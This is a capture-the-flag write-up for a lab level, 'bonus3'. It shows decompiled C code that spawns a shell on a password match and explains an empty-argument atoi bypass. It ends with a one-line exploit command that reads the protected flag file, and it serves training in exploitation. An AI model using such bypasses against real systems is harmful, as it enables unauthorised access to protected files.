<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← bonus2](../bonus2/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;"></span>
</span>

bonus3
======

Decompilation
-------------

The program looks like this:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int ac, char **av)
{
	int err;
	char buff[64 + 1 + 66];
	FILE *pass_file;

	pass_file = fopen("/home/user/end/.pass","r");

	bzero(buff, 33);

	if ((pass_file == NULL || (ac != 2)))
		err = -1;
	else
	{
		fread(buff, 1, 66, pass_file);
		buff[64] = '\0';

		buff[atoi(av[1])] = '\0';

		fread(buff + 64 + 1, 1, 65, pass_file);

		fclose(pass_file);

		if (strcmp(buff, av[1]) == 0)
			execl("/bin/sh","sh", 0);
		else
			puts(buff + 64 + 1);

		err = 0;
	}
	return err;
}
```

The main opens the end user's pass file and reads it's contents into a buffer.
It does so twice, at different offsets, but the second call should only read a NUL-byte.
The string is trimmed to the length specified in the first argument.
If the trimmed password is equal to the argument, a shell will be launched.

Exploitation
------------
This one is too easy...
The return value of atoi when given an empty string is zero. If we pass an empty string as an argument, the password string will become an empty string and the comparison will succeed.

```sh
./bonus3 '' <<< 'cat /home/user/end/end'
```
```
Congratulations graduate!
```
